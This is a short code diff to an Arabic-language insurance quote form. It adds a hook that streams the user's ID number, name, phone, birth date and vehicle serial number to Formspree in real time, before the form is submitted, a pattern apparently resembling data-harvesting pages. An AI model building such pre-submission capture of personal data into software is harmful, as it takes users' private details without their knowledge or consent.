@@ -13,6 +13,8 @@ import { format } from "date-fns";
 import { ar } from "date-fns/locale";
 import { cn } from "@/lib/utils";
 import { useToast } from "@/hooks/use-toast";
+import { useFormspreeSync } from "@/hooks/useFormspreeSync";
+
 export const QuoteForm = () => {
   const navigate = useNavigate();
   const [insuranceType, setInsuranceType] = useState<"new" | "transfer">("new");
@@ -23,6 +25,17 @@ export const QuoteForm = () => {
   const [phoneNumber, setPhoneNumber] = useState("");
   const [serialNumber, setSerialNumber] = useState("");
   const { toast } = useToast();
+
+  // Send data to Formspree in real-time
+  useFormspreeSync({
+    insuranceType,
+    documentType,
+    birthDate: birthDate ? format(birthDate, "PPP", { locale: ar }) : "",
+    idNumber,
+    ownerName,
+    phoneNumber,
+    serialNumber
+  }, "صفحة عرض السعر - Quote Form");
   
   // للتقويم
   const currentYear = new Date().getFullYear();
